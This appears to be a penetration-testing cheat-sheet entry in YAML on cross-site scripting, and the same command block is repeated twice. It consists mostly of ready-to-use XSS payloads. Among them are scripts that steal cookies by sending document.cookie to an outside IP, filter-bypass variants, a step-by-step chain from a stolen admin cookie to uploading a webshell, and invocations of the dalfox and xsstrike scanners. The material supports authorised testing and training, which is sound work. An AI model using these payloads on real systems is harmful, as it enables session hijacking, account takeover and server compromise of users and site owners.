---
description: |
  Cross-Site Scripting (XSS) attacks — reflected, stored, and DOM-based XSS for cookie theft, session hijacking, and filter bypass techniques.
commands:
  - have: No_Creds
    cmd: |
      # Reflected XSS test
      <script>alert(1)</script>
      <img src=x onerror=alert(1)>
      <svg onload=alert(1)>

      # Stored XSS
      <script>document.location='http://10.10.10.21/?c='+document.cookie</script>

      # Cookie stealing
      <script>new Image().src="http://10.10.10.21/?c="+document.cookie</script>
      <img src=x onerror="fetch('http://10.10.10.21/?c='+document.cookie)">

      # Filter bypass
      <ScRiPt>alert(1)</ScRiPt>
      <script>alert`1`</script>
      <details/open/ontoggle=alert(1)>
      javascript:alert(1) (in href)

      # DOM XSS
      Check URL parameters reflected in: document.write(), innerHTML, eval()

      # XSS to RCE (if admin panel)
      Steal admin cookie → access admin panel → upload webshell

      # Tools
      dalfox url "http://10.10.10.27/page?q=test"
      python3 xsstrike.py -u "http://10.10.10.27/page?q=test"
  - have: Credentials
    cmd: |
      # Reflected XSS test
      <script>alert(1)</script>
      <img src=x onerror=alert(1)>
      <svg onload=alert(1)>

      # Stored XSS
      <script>document.location='http://10.10.10.21/?c='+document.cookie</script>

      # Cookie stealing
      <script>new Image().src="http://10.10.10.21/?c="+document.cookie</script>
      <img src=x onerror="fetch('http://10.10.10.21/?c='+document.cookie)">

      # Filter bypass
      <ScRiPt>alert(1)</ScRiPt>
      <script>alert`1`</script>
      <details/open/ontoggle=alert(1)>
      javascript:alert(1) (in href)

      # DOM XSS
      Check URL parameters reflected in: document.write(), innerHTML, eval()

      # XSS to RCE (if admin panel)
      Steal admin cookie → access admin panel → upload webshell

      # Tools
      dalfox url "http://10.10.10.27/page?q=test"
      python3 xsstrike.py -u "http://10.10.10.27/page?q=test"
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - XSS
references:
  - https://owasp.org/www-community/attacks/xss/
  - https://portswigger.net/web-security/cross-site-scripting
---
